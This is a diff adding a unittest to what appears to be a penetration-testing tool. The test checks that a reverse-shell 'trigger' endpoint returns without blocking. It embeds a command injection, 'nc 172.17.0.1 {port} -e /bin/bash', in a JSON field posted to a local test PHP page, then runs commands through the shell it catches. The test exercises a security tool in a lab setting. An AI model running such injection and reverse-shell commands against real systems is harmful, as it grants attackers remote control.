@@ -1127,6 +1127,140 @@ echo "=== End of Payload ==="
         
         print(f"✅ Test session stopped successfully: {session_id}")
 
+    def test_10_trigger_action_non_blocking(self):
+        """Test the new trigger_action functionality for non-blocking reverse shell trigger"""
+        print("\n🎯 Test: Trigger action non-blocking reverse shell functionality")
+        
+        # Ensure clean environment before test
+        self.ensure_clean_environment()
+        
+        # Step 1: Create a listener session (WITHOUT establishing connection yet)
+        session_id = f"{self.session_prefix}_trigger_test"
+        port = REVERSE_SHELL_CONFIG["alternative_port"]  # Use alternative port (4501)
+        
+        listener_data = {
+            "session_id": session_id,
+            "port": port,
+            "listener_type": "pwncat"
+        }
+        
+        try:
+            # Start the listener
+            print(f"🎧 Starting listener on port {port} for trigger test")
+            listener_response = requests.post(
+                f"{self.base_url}/api/reverse-shell/listener/start", 
+                json=listener_data, 
+                timeout=TIMEOUTS["medium"]
+            )
+            
+            self.assertEqual(listener_response.status_code, 200)
+            listener_result = listener_response.json()
+            self.assertTrue(listener_result.get("success", False))
+            
+            print(f"✅ Listener started: {session_id}")
+            self.active_sessions.append(session_id)
+            
+            # Step 2: Test the NON-BLOCKING trigger (this is the key test!)
+            # This command would normally block the server, but with trigger_action it should return immediately
+            trigger_command = f'curl -X POST http://localhost:8080/test_reverse_shell.php -H "Content-Type: application/json" -d "{{\\"command\\": \\"nc 172.17.0.1 {port} -e /bin/bash\\"}}"'
+            
+            print(f"🚀 Testing NON-BLOCKING trigger action with reverse shell command")
+            print(f"   Command: {trigger_command[:80]}...")
+            
+            # Measure time to ensure it's truly non-blocking
+            import time
+            start_time = time.time()
+            
+            # Call the new trigger_action endpoint
+            trigger_data = {
+                "trigger_command": trigger_command,
+                "timeout": 15
+            }
+            
+            response = requests.post(
+                f"{self.base_url}/api/reverse-shell/{session_id}/trigger",
+                json=trigger_data,
+                timeout=TIMEOUTS["medium"]
+            )
+            
+            end_time = time.time()
+            response_time = end_time - start_time
+            
+            # Verify the response
+            self.assertEqual(response.status_code, 200)
+            result = response.json()
+            
+            # The trigger should return immediately with success
+            self.assertTrue(result.get("success", False))
+            self.assertEqual(result.get("session_id"), session_id)
+            self.assertIn("background", result.get("message", "").lower())
+            
+            # Critical test: Response should be nearly immediate (< 3 seconds)
+            # Note: We allow up to 3 seconds to account for network latency and Docker overhead
+            self.assertLess(response_time, 3.0, 
+                           f"Trigger action took {response_time:.2f}s - should be non-blocking!")
+            
+            print(f"✅ Trigger action returned immediately in {response_time:.2f}s (non-blocking)")
+            print(f"   Response: {result}")
+            
+            # Additional verification: The response time should be significantly faster than
+            # what a blocking curl command would take (which would be 5+ seconds)
+            if response_time < 2.5:
+                print("✅ Response time is excellent (< 2.5s)")
+            elif response_time < 3.0:
+                print("✅ Response time is acceptable (< 3.0s) - trigger is non-blocking")
+            else:
+                print("⚠️  Response time is higher than expected but still non-blocking")
+            
+            # Step 3: Wait for potential connection and verify listener is still responsive
+            print("⏳ Waiting for potential reverse shell connection...")
+            time.sleep(6)  # Give time for trigger to potentially establish connection
+            
+            # Check if connection was established via the trigger
+            status_response = requests.get(
+                f"{self.base_url}/api/reverse-shell/{session_id}/status", 
+                timeout=TIMEOUTS["quick"]
+            )
+            
+            if status_response.status_code == 200:
+                status_result = status_response.json()
+                print(f"📊 Post-trigger status: {status_result}")
+                
+                if status_result.get("is_connected", False):
+                    print("✅ Trigger successfully established reverse shell connection!")
+                    
+                    # Test that we can execute commands through the triggered connection
+                    test_response = requests.post(
+                        f"{self.base_url}/api/reverse-shell/{session_id}/command",
+                        json={"command": "echo 'triggered_connection_works'", "timeout": 10},
+                        timeout=TIMEOUTS["medium"]
+                    )
+                    
+                    if test_response.status_code == 200:
+                        test_result = test_response.json()
+                        if test_result.get("success", False):
+                            print("✅ Commands work through triggered connection")
+                        else:
+                            print("⚠️  Commands failed through triggered connection")
+                    
+                else:
+                    print("ℹ️  No connection established (trigger might have failed, but that's OK for this test)")
+                    print("   The important part is that the trigger was non-blocking")
+            
+            # Step 4: Verify session management is still working
+            print("🧪 Verifying session management still works after trigger...")
+            sessions_response = requests.get(f"{self.base_url}/api/reverse-shell/sessions", 
+                                          timeout=TIMEOUTS["quick"])
+            self.assertEqual(sessions_response.status_code, 200)
+            sessions = sessions_response.json()
+            self.assertIn(session_id, sessions)
+            
+            print(f"✅ Session management remains functional after trigger action")
+            
+        finally:
+            # Clean up session
+            self.cleanup_reverse_shell_session(session_id)
+
 
 if __name__ == "__main__":
     unittest.main(verbosity=2)
